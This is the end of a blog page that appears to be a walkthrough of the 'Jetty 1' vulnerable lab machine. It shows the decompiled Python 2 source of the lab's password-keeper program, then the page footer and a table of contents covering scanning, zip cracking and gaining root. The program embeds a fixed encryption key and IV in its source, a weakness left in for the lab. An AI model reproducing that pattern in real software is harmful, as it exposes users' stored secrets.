\\___|\\__,_|_|\\_\\__,  |     |_|\\_\\___|\\___| .__/ \\___|_|   &#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;                          |___/                    |_|   &#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27;166fe2294df5d0f3&#x27;</span></span><br><span class="line">    key = <span class="string">&#x27;N2FlMjE4ZmYyOTI4ZjZiMg==	&#x27;</span></span><br><span class="line">    database = read_database()</span><br><span class="line">    loop = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">while</span> loop:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Choose what you want to do: &#x27;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;1) See your passwords!&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;2) Generate a cipher-password&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;3) Close&#x27;</span></span><br><span class="line">        option = raw_input(<span class="string">&#x27;Insert your selection here --&gt; &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> option == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Showing content of your secret passwords...&#x27;</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">            show_keys(database, key, iv)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">            returned = raw_input(<span class="string">&#x27;Press any button to return to the menu...&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> option == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">            title = raw_input(<span class="string">&#x27;Type the name of the application: &#x27;</span>)</span><br><span class="line">            password = raw_input(<span class="string">&#x27;Type the password(BEWARE OF SHOULDER SURFING!!!): &#x27;</span>)</span><br><span class="line">            generate_key(password, title, key, iv)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">            returned = raw_input(<span class="string">&#x27;Press any button to return to the menu...&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> option == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                loop = <span class="literal">False</span></span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Bye Byeeeeeeeeeeeee&#x27;</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;WHAT? FAILURE TO COMMUNICATE... Reseting connection...&#x27;</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">            returned = raw_input(<span class="string">&#x27;Press any button to return to the menu...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> main()                                                        </span><br></pre></td></tr></table></figure></div><div><ul class="post-copyright"><li class="post-copyright-author"> <strong>本文作者：</strong> D9</li><li class="post-copyright-link"> <strong>本文链接：</strong> <a href="https://dnie9.com/Jetty-1-wp.html" title="Jetty 1 Workthrough">https://dnie9.com/Jetty-1-wp.html</a></li><li class="post-copyright-license"> <strong>版权声明：</strong> 本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i> BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><div><div><div style="text-align:center;color:#ccc;font-size:14px">------ 本文结束------</div></div></div><footer class="post-footer"><div class="post-nav"><div class="post-nav-item"><a href="/muweb-2.html" rel="prev" title="那些年那些靶机2"><i class="fa fa-chevron-left"></i> 那些年那些靶机2</a></div><div class="post-nav-item"></div></div></footer></article></div><script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc"> 文章目录</li><li class="sidebar-nav-overview"> 站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">靶机描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Download"><span class="nav-number">2.</span> <span class="nav-text">Download</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description"><span class="nav-number">3.</span> <span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#NMAP-SCAN"><span class="nav-number">4.1.</span> <span class="nav-text">NMAP-SCAN</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DirbScan-Nikto"><span class="nav-number">4.2.</span> <span class="nav-text">DirbScan+Nikto</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FTP-Cracked-zip-password-with-john"><span class="nav-number">5.</span> <span class="nav-text">FTP-Cracked zip password with john</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Get-ROOT-Shell"><span class="nav-number">6.</span> <span class="nav-text">Get-ROOT-Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cracked-Pyinstaller-exe"><span class="nav-number">7.</span> <span class="nav-text">Cracked-Pyinstaller-exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%99%84%E5%BD%95%EF%BC%9A"><span class="nav-number">8.</span> <span class="nav-text">附录：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Password-keeper-exe%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">9.</span> <span class="nav-text">Password_keeper.exe程序的源代码</span></a></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" alt="D9" src="/images/logo.png"><p class="site-author-name" itemprop="name">D9</p><div class="site-description" itemprop="description">谁人与我共黄昏…</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"> <a href="/archives"><span class="site-state-item-count">10</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"> <span class="site-state-item-count">3</span> <span class="site-state-item-name">分类</span></div></nav></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/DDnie19" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DDnie19" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i> GitHub</a></span><span class="links-of-author-item"><a href="mailto:dou0422@gmail.com" title="E-Mail → mailto:dou0422@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i> E-Mail</a></span></div></div><div class="back-to-top motion-element"><i class="fa fa-arrow-up"></i> <span>0%</span></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright"> &copy; <span itemprop="copyrightYear">2021</span><span class="with-love"><i class="fa fa-heart"></i></span> <span class="author" itemprop="copyrightHolder">D9</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-chart-area"></i></span> <span title="站点总字数">37k</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-coffee"></i></span> <span title="站点阅读时长">34 分钟</span></div> <span>本站已运行<span id="showDays"></span></span><script>var seconds=1e3,minutes=60*seconds,hours=60*minutes,days=24*hours,years=365*days,birthDay=Date.UTC(2021,1,1,0,0,0);setInterval(function(){var e=new Date,s=e.getFullYear(),t=e.getMonth()+1,a=e.getDate(),o=e.getHours(),r=e.getMinutes(),n=e.getSeconds(),h=Date.UTC(s,t,a,o,r,n)-birthDay,u=Math.floor(h/years),d=Math.floor(h/days-365*u),y=Math.floor((h-(365*u+d)*days)/hours),i=Math.floor((h-(365*u+d)*days-y*hours)/minutes),l=Math.floor((h-(365*u+d)*days-y*hours-i*minutes)/seconds);document.getElementById("showDays").innerHTML=u+"年"+d+"天"+y+"小时"+i+"分钟"+l+"秒"},1e3)</script><script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script><div class="busuanzi-count"><script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-user"></i></span><span class="site-uv" title="总访客量"><span id="busuanzi_value_site_uv"></span></span></span> <span class="post-meta-divider">|</span><span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span><span class="site-pv" title="总访问量"><span id="busuanzi_value_site_pv"></span></span></span></div></div></footer></div><script src="/lib/anime.min.js"></script><script src="//cdn.jsdelivr.net/gh/theme-next/theme-next-pjax@0/pjax.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script><div id="pjax"></div></body></html>